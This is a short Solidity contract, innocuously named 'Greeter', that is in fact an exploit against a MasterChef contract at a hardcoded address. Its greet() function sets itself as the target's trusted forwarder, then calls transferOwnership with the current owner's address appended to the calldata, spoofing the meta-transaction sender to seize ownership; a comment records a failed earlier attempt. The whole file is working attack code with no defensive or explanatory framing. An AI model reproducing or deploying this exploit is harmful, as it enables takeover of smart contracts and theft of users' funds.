//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IMasterChef {
    // It doesn't work -> selector does not match
    // function transferOwnership(address newOwner, address owner) external; 

    function setTrustedForwarder(address _trustedForwarder) external; 

    function owner() external pure returns(address);
}

contract Greeter {

    address private owner;

    address private constant MASTER_CHEF = 0x70873211CB64c1D4EC027Ea63A399A7d07c4085B;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function greet() external onlyOwner {
        IMasterChef(MASTER_CHEF).setTrustedForwarder(address(this));
        
        address(MASTER_CHEF).call(abi.encodePacked(
            abi.encodeWithSelector(bytes4(keccak256("transferOwnership(address)")), address(this)), 
            IMasterChef(MASTER_CHEF).owner())
        );
    }
}
